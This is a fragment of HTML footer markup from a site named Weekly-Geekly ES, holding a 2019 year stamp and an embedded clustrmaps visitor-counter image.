      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>